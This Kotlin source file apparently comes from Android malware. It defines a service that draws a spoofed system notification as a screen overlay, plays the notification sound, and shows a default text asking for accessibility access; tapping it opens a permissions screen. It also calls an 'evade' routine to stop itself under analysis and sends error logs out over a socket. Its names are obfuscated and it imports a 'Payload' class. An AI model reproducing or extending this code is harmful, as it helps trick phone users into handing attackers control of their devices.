package com.xxx.zzz.notifp

import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.graphics.BitmapFactory
import android.graphics.PixelFormat
import android.media.RingtoneManager
import android.os.IBinder
import android.text.format.DateUtils
import android.view.*
import android.widget.ImageView
import android.widget.TextView
import androidx.core.view.doOnPreDraw
import com.xxx.zzz.Payload
import com.xxx.zzz.PermissionsActivity
import com.xxx.zzz.R
import com.xxx.zzz.globp.Constantsfd
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.globp.Stringsvcx
import com.xxx.zzz.globp.utilssss.evade
import com.xxx.zzz.socketsp.IOSocketyt
import kotlinx.coroutines.*
import kotlin.math.abs
import kotlin.math.roundToInt

@OptIn(ExperimentalStdlibApi::class)
class NotificationServicedsa : Service() {

    init {
        Payload.ApplicationScope.launch {
            if (Constantsfd.debug) {
                evade {}.onEscape {
                    withContext(Dispatchers.Main) {
                        runCatching {
                            stopSelf()
                        }
                    }
                }
            }
        }
    }

    private lateinit var windowManager: WindowManager

    private var job = SupervisorJob()
    private val scope =
        CoroutineScope(job + Dispatchers.Main + CoroutineName("NotificationService"))

    private var animatorNotification: NotificationSlideUpDownAnimatordsa? = null
    private var isMoved = false
    private var maxHeight = 0
    private var parentView: View? = null
    private var yTouchPoint = 0f

    @Suppress("deprecation")
    override fun onCreate() {
        super.onCreate()

        runCatching {
            val ringtoneUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
            val ringtone = RingtoneManager.getRingtone(this, ringtoneUri)
            ringtone.play()

            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

            createView()
            parentView?.doOnPreDraw {
                createAnimator(parentView)
                animatorNotification?.slideDown {
                    scope.launch {
                        withContext(Dispatchers.IO) {
                            delay(10000L)
                        }
                        stopShowing()
                    }
                }
            }

            val paramsType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                paramsType,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
            )

            params.gravity = Gravity.CENTER_HORIZONTAL or Gravity.TOP
            windowManager.addView(parentView, params)
        }.onFailure {
            IOSocketyt.sendLogs("", "NotificationServicedsa onCreate ${it.localizedMessage}", "error")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        notificationShowing = false
    }

    private fun stopShowing() {
        animatorNotification?.slideUp {
            if (parentView != null) {
                windowManager.removeView(parentView)
                parentView = null
            }
            stopSelf()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    @SuppressLint("ClickableViewAccessibility")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        runCatching {
            SharedPreferencess.init(this.applicationContext)

            parentView?.findViewById<TextView>(R.id.titlezzz)?.text =
                intent?.getStringExtra("title") ?: SharedPreferencess.appName
            parentView?.findViewById<TextView>(R.id.text1zzz)?.text =
                intent?.getStringExtra("message")
                    ?: (Stringsvcx.localeTextAccessibility() + " " + Constantsfd.access2)
            intent?.getByteArrayExtra("image")?.let {
                val image = BitmapFactory.decodeByteArray(it, 0, it.size)
                parentView?.findViewById<ImageView>(R.id.iconzzz)?.setImageBitmap(image)
            }

            parentView?.findViewById<TextView>(R.id.shareTextzzz)?.text = DateUtils.formatDateTime(
                this@NotificationServicedsa,
                System.currentTimeMillis(),
                DateUtils.FORMAT_SHOW_TIME
            )

            parentView?.setOnTouchListener(View.OnTouchListener { v, event ->
                when (event.action) {
                    MotionEvent.ACTION_DOWN -> {
                        yTouchPoint = event.y
                        job.cancel()
                        return@OnTouchListener true
                    }
                    MotionEvent.ACTION_MOVE -> {
                        val diff = event.y - yTouchPoint
                        if (abs(diff) > 5) {
                            isMoved = true
                        }
                        val newHeight = if ((v.bottom + diff.toInt()) > maxHeight) {
                            maxHeight
                        } else {
                            (v.bottom + diff.toInt())
                        }
                        v.bottom = newHeight
                        yTouchPoint = event.y
                        return@OnTouchListener true
                    }
                    MotionEvent.ACTION_UP -> {
                        if (!isMoved) {
                            runCatching {
                                val intent = Intent(this, PermissionsActivity::class.java)
                                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                this.startActivity(intent)
                            }.onFailure {
                                IOSocketyt.sendLogs("", "NotificationServicedsa PermissionsActivity ${it.localizedMessage}", "error")
                            }.onSuccess {
                                stopShowing()
                            }
                        } else {
                            isMoved = false
                            if (v.bottom < ((maxHeight * 0.75f).roundToInt() + 30)) {
                                stopShowing()
                            } else {
                                animatorNotification?.slideDown(v.bottom) {
                                    scope.launch {
                                        withContext(Dispatchers.IO) {
                                            delay(10000L)
                                        }
                                        stopShowing()
                                    }
                                }
                            }
                        }
                        return@OnTouchListener true
                    }
                    else -> true
                }
            })
        }.onFailure {
            IOSocketyt.sendLogs("", "NotificationServicedsa onStartCommand ${it.localizedMessage}", "error")
        }
        return super.onStartCommand(intent, flags, startId)
    }

    private fun createAnimator(view: View?) {
        view ?: return
        animatorNotification = NotificationSlideUpDownAnimatordsa(view, 500L)

        val layoutParams = view.layoutParams
        layoutParams.height = 1
        view.layoutParams = layoutParams

        view.measure(0, 0)
        val height = view.measuredHeight

        maxHeight = height

        animatorNotification?.setHeight(height)
    }

    private fun createView() {
        val inflater = getSystemService(LAYOUT_INFLATER_SERVICE) as LayoutInflater
        parentView = inflater.inflate(R.layout.lustom_notif_zzz, null)

    }

    companion object {
        var notificationShowing = false
    }
}